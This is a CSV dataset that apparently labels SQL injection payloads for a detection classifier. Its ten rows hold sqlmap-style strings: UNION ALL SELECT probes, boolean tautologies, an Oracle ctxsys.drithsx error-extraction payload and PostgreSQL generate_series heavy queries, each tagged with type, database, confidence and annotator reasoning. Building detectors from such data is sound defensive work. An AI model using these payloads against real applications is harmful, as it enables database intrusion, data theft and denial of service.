payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-8432 ) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2000,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8432 ) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--"
"-4889"" ) ) as vvuo where 8060 = 8060 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,2001,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4889"" ) ) as vvuo where 8060 = 8060 or ( 8459 = 8459 ) *4906--"
"1"" ) where 3826 = 3826",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2002,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 3826 = 3826"
-3211 ) ) as fsej where 6348 = 6348 or 9805 = 3783--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2003,boolean_blind,generic,Pattern match: 'or 9805 = 3783' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3211 ) ) as fsej where 6348 = 6348 or 9805 = 3783--
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lvck' = 'lvck",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,2004,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lvck' = 'lvck"
"-1048%"" or 3038 = 3038",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2005,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-1048%"" or 3038 = 3038"
"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2006,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )"
"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,2007,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--"
"1"" ) where 9499 = 9499",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2008,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 9499 = 9499"
"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2009,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw"
